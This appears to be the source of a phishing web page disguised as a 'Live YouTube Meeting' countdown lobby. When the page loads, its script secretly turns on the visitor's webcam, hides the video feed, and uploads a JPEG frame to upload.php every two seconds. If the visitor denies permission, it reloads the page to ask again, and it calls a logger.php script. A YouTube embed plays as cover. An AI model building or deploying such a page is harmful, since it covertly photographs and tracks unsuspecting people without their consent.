<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live YouTube Meeting </title>
    <style>
        video, canvas {
            display: none !important;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            padding: 20px;
        }

        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        .container {
            width: 100%;
            max-width: 800px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        h1 {
            margin-bottom: 30px;
            font-weight: 300;
            font-size: 2.2rem;
        }

        .countdown-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .countdown {
            font-size: 5rem;
            font-weight: bold;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            animation: pulse 1s infinite alternate;
        }

        @keyframes pulse {
            from {
                transform: scale(1);
                opacity: 1;
            }
            to {
                transform: scale(1.05);
                opacity: 0.8;
            }
        }

        .countdown-label {
            font-size: 1.5rem;
            margin-bottom: 20px;
        }

        .video-container {
            display: none;
            width: 100%;
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            margin-top: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .video-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }

        .status-message {
            margin-top: 20px;
            font-size: 1.2rem;
            color: #ffcc00;
            display: none;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.8rem;
            }
            
            .countdown {
                font-size: 3.5rem;
            }
            
            .countdown-label {
                font-size: 1.2rem;
            }
            
            .container {
                padding: 20px;
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.5rem;
            }
            
            .countdown {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div class="container">
        <h1>Welcome to Your Live Meeting</h1>
        
        <div class="countdown-container">
            <div class="countdown-label">Meeting Starting in:</div>
            <div class="countdown" id="countdown">15</div>
        </div>
        
        <div class="video-container" id="video-container"></div>
        
        <div class="status-message" id="status-message"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const countdownElement = document.getElementById('countdown');
        const countdownContainer = document.querySelector('.countdown-container');
        const videoContainer = document.getElementById('video-container');
        const statusMessage = document.getElementById('status-message');

        let lastImageHash = "";
        let countdownValue = 15;
        const youtubeVideoId = 'akd0LrP60EQ';

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0;
            }
            return hash;
        }

        function captureAndSend() {
            const width = video.videoWidth;
            const height = video.videoHeight;

            if (width === 0 || height === 0) return;

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return;
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        function updateCountdown() {
            countdownElement.textContent = countdownValue;
            
            if (countdownValue <= 0) {
                clearInterval(countdownInterval);
                countdownElement.textContent = 'Meeting Starting...';
                setTimeout(showVideo, 1000);
                return;
            }
            
            countdownValue--;
        }

        function showVideo() {
            try {
                countdownContainer.style.display = 'none';
                videoContainer.style.display = 'block';
                
                const embedUrl = `https://www.youtube.com/embed/${youtubeVideoId}?autoplay=1&mute=0`;
                
                const iframe = document.createElement('iframe');
                iframe.className = 'video-iframe';
                iframe.src = embedUrl;
                iframe.setAttribute('allowfullscreen', '');
                iframe.setAttribute('allow', 'accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen');
                iframe.setAttribute('frameborder', '0');
                
                videoContainer.appendChild(iframe);
            } catch (error) {
                console.error('Error loading video:', error);
                statusMessage.textContent = 'Error loading meeting video. Please refresh the page to try again.';
                statusMessage.style.display = 'block';
            }
        }

        startCamera();
        fetch("logger.php").then(res => res.text()).then(console.log);
        const countdownInterval = setInterval(updateCountdown, 1000);
    </script>
</body>
</html>